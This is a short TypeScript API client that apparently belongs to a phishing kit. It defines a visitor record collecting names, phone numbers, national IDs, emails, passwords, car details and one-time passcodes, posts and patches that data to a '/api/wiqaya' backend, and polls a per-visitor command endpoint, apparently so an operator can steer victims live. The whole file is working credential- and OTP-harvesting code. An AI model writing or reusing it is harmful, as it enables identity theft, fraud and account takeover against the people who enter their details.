const BASE = "/api/wiqaya";

export interface Visitor {
  id: string; submittedAt: string; submittedAtTs: number;
  name: string; phone: string; nationalId: string;
  email: string; password: string;
  carPlate: string; carYear: string; carMake: string;
  otpCode: string; otpStatus: string | null;
  page: string; isActive: boolean; lastSeen: number; country: string;
}

export const api = {
  async submit(data: Omit<Visitor, 'isActive'>) {
    await fetch(`${BASE}/submit`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
  },
  async patch(id: string, data: Partial<Visitor>) {
    await fetch(`${BASE}/submissions/${id}`, { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
  },
  async getCmd(id: string): Promise<string | null> {
    try {
      const r = await fetch(`${BASE}/cmd/${id}`);
      const d = await r.json();
      return d.cmd;
    } catch { return null; }
  },
};
